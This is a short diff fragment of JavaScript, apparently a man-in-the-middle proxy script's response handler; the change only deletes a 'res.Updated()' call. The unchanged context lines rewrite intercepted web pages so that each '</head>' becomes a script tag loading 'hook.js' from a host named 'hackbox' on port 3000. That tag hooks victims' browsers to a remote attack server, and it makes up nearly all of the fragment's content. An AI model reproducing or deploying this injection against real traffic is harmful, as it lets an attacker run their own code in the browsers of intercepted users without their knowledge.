@@ -11,7 +11,6 @@ function onResponse(req, res) {
                 '</head>', 
                 '<script type="text/javascript" src="http://hackbox:3000/hook.js"></script></head>' 
             ); 
-            res.Updated();
         }
     }
 }
